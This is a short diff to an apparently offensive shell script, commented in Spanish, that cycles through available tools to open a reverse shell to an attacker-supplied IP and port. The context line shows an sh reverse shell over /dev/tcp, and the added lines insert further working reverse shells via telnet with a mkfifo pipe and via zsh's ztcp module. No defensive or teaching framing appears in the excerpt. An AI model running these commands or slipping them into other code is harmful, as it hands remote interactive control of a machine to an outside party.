@@ -101,7 +101,19 @@ if command -v sh > /dev/null 2>&1; then
     /bin/sh -i >& /dev/tcp/$IP/$PUERTO 0>&1 && exit
 fi
 
-echo "[-] No se pudo establecer una conexión reverse shell con ninguna de las herramientas disponibles."
+# Probar reverse shell en telnet y nc
+echo "[+] Intentando reverse shell en telnet..."
+if command -v telnet > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en telnet"
+    TF=$(mktemp -u);mkfifo $TF && telnet $IP $PUERTO 0<$TF | sh 1>$TF
+fi
+
+# Probar reverse shell en zsh 
+echo "[+] Intentando reverse shell en zsh..."
+if command -v zsh > /dev/null 2>&1; then
+    echo "[*] Ejecutando Reverse Shell en zsh"
+    zsh -c "zmodload zsh/net/tcp && ztcp $IP $PUERTO && zsh >&\$REPLY 2>&\$REPLY 0>&\$REPLY"
+fi
 
 # Otros métodos de shell inverso
 # Bash inverso
